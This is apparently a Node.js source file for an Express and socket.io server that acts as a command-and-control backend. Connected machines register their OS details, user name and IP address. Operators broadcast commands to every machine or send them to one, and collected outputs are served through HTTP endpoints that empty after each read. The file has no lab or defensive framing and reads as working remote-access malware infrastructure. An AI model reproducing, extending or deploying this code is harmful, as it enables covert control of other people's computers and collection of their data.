const express = require("express")
const app = express()
const cors = require("cors")
const socket = require("socket.io")
const USER = require("./api/module/user")
const db = require("./api/config/dbconnect")
const init_router = require("./api/router/index")

require("dotenv").config()
const PORT = 5678
app.use(cors())
app.use(express.json())

db()
init_router(app)

const all_data = []
app.use("/command/data", (req, res) => {
  try {
    res.status(200).json({
      success: true,
      data: all_data
    })
    while (all_data.length > 0) {
      all_data.pop()
    }
    return 1
  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "error from server"
    })
  }
})

const all_data_only = []

app.use("/data/only", (req, res) => {
  try {
    res.status(200).json({
      success: true,
      data: all_data_only
    })
    while (all_data_only.length > 0) {
      all_data_only.pop()
    }
    return 1
  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "error from server"
    })
  }
})

const server = app.listen(PORT, () => {
  console.log(`server is running ${PORT}`)
})

const io = socket(server, {
  cors: {
    origin: "*",
    credentials: true,
    methods: ["GET", "PUT", 'PATCH', 'DELETE', 'POST']
  }
})


io.on("connection", (socket) => {
  console.log("user connected")
  socket.on("command", (data) => {
    socket.broadcast.emit("server_send_command", data)
  })
  socket.on("information", async (data) => {
    const check_user = await USER.findOne({ ip_address: data.data[5] })
    socket.ip = data.data[5]
    if (check_user) {
      socket.join(check_user._id.toString())
      await USER.findOneAndUpdate({ ip_address: data.data[5] }, { $set: { online: true } }, { new: true })
      await USER.findOneAndUpdate({ ip_address: data.data[5] }, { $inc: { session: 1 } }, { new: true })
      await USER.findOneAndUpdate({ ip_address: data.data[5] }, { $set: { ip_socket: check_user._id.toString() } }, { new: true })
    } else {
      socket.join(socket.id)
      console.log(data.data);
      const newUser = await new USER({
        ip_address: data.data[5],
        system: data.data[0],
        release: data.data[1],
        version: data.data[2],
        machine: data.data[3],
        user_name: data.data[4],
        ip_socket: socket.id,
        online: true
      })
      newUser.save()
    }
  })
  socket.on("send_data_all_user", (data) => {
    all_data.push(data)
  })


  socket.on("send_to_only", (data) => {
    try {
      socket.to(data.id).emit("server_send_to_only_you", data.cmd)
    } catch {
      console.log("err")
    }
  })

  socket.on("only_to_all", (data) => {
    try {
      all_data_only.push(data)
    } catch (err) {
      console.log(err)
    }
  })

  socket.on("disconnect", async () => {
    console.log("user ip disconnected" + socket.ip)
    await USER.findOneAndUpdate({ ip_address: socket.ip }, {
      $set: {
        online: false,
        ip_socket: "null"
      }
    })
  })
})